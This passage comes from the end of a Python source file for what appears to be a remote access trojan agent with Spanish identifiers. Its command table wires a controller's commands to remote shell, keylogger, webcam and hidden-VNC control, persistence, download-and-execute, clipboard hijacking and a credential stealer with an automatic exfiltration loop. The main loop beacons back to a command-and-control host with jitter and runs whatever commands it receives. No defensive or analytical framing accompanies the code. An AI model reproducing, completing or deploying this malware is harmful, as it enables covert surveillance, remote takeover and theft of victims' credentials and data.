        _STEAL["url"] = a.get("url") or ""
    if "intervalo" in a:
        try:
            _STEAL["intervalo"] = max(60, int(a["intervalo"]))
        except Exception:
            pass
    on = bool(a.get("on"))
    if on and not _STEAL["auto"]:
        _STEAL["auto"] = True
        threading.Thread(target=_stealer_auto_loop, daemon=True).start()
    elif not on:
        _STEAL["auto"] = False
    return {"auto": _STEAL["auto"], "url": _STEAL["url"],
            "intervalo": _STEAL["intervalo"]}


def _stealer_auto_loop():
    while _STEAL["auto"]:
        try:
            if not _STEAL["activo"]:
                _stealer_recolectar({"url": _STEAL["url"]})
        except Exception:
            pass
        fin = time.time() + _STEAL["intervalo"]
        while _STEAL["auto"] and time.time() < fin:
            time.sleep(2)


# ============================================================================

HANDLERS = {
    "ping": _ping, "shell": _shell, "sysinfo": lambda a: _sysinfo(),
    "listar_dir": _listar_dir, "procesos": _procesos, "captura": _captura,
    "raton": _raton, "swap_raton": _swap_raton, "teclado": _teclado, "webcam": _webcam,
    "webcam_iniciar": _webcam_iniciar, "webcam_frame": _webcam_frame, "webcam_parar": _webcam_parar,
    "keylogger_iniciar": _keylogger_iniciar, "keylogger_leer": _keylogger_leer,
    "persistir": _persistir, "abrir_url": _abrir_url, "mensaje": _mensaje,
    "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
    "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
    "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar, "hvnc_navegar": _hvnc_navegar,
    "hvnc_estado": _hvnc_estado, "hvnc_opciones": _hvnc_opciones, "log": _log_leer,
    "hvnc_captura": _hvnc_captura, "hvnc_raton": _hvnc_raton, "hvnc_teclado": _hvnc_teclado,
    "hvnc_stream": _hvnc_stream, "captura_stream": _captura_stream,
    "bloquear_entrada": _bloquear, "clip_get": _clip_get, "clip_set": _clip_set,
    "desconectar": _desconectar,
    "stealer_recolectar": _stealer_recolectar, "stealer_estado": _stealer_estado,
    "stealer_paquete": _stealer_paquete, "stealer_exfil": _stealer_exfil,
    "stealer_auto": _stealer_auto,
}

_RUIDO = ("ping", "raton", "teclado", "hvnc_captura", "hvnc_raton",
          "hvnc_teclado", "hvnc_stream", "captura_stream", "webcam_frame",
          "captura", "hvnc_estado")


def _bucle(sock):
    global SLEEP, JITTER
    while True:
        msg = _recibir(sock)
        if msg is None:
            return
        t = msg.get("tipo")
        if t == "beacon":
            SLEEP = float(msg.get("sleep", SLEEP))
            JITTER = float(msg.get("jitter", 0)) / 100.0
            _log("BEACON", f"sleep={SLEEP} jitter={JITTER}")
            continue
        if t != "comando":
            continue
        cmd = msg.get("cmd")
        if cmd not in _RUIDO:
            _log("CMD", cmd)
        fn = HANDLERS.get(cmd)
        try:
            datos = fn(msg.get("args") or {}) if fn else {"error": "cmd desconocido"}
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": True, "datos": datos})
        except Exception as e:
            _log("ERROR", f"{cmd}: {e}")
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": False, "error": str(e)})
        if _SALIR:
            os._exit(0)


def _intentar(h, puerto, timeout):
    try:
        s = socket.create_connection((h, puerto), timeout=timeout)
        s.settimeout(None)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)   # <- fluidez
        except Exception:
            pass
        return s
    except Exception:
        return None


def _conectar(objetivos, puerto, timeout=5.0):
    logrados = {}

    def _w(h):
        s = _intentar(h, puerto, timeout)
        if s is not None:
            logrados[h] = s

    hilos = [threading.Thread(target=_w, args=(h,), daemon=True) for h in objetivos]
    for t in hilos:
        t.start()
    fin = time.time() + timeout + 1.0
    while not logrados and time.time() < fin:
        time.sleep(0.05)
    if not logrados:
        return None
    _, s = next(iter(logrados.items()))
    for h2, s2 in logrados.items():
        if s2 is not s:
            try:
                s2.close()
            except Exception:
                pass
    return s


def main():
    host, puerto, fb = _cfg()
    objetivos = []
    for h in (host, fb, "127.0.0.1"):
        if h and h not in objetivos:
            objetivos.append(h)
    _log("AGENTE", f"inicio pid={os.getpid()} objetivos={objetivos} puerto={puerto}")
    while True:
        s = _conectar(objetivos, puerto, timeout=5.0)
        if s is not None:
            _SOCK_ACT["s"] = s
            try:
                _enviar(s, {"tipo": "hola", "info": _sysinfo()})
                _log("AGENTE", "conectado al controlador")
                _bucle(s)
                _log("AGENTE", "desconectado")
            except SystemExit:
                return
            except Exception as e:
                _log("AGENTE", f"error de sesion: {e}")
            finally:
                _SOCK_ACT["s"] = None
            try:
                s.close()
            except Exception:
                pass
        time.sleep(SLEEP * (1 + random.uniform(-JITTER, JITTER)))


if __name__ == "__main__":
    main()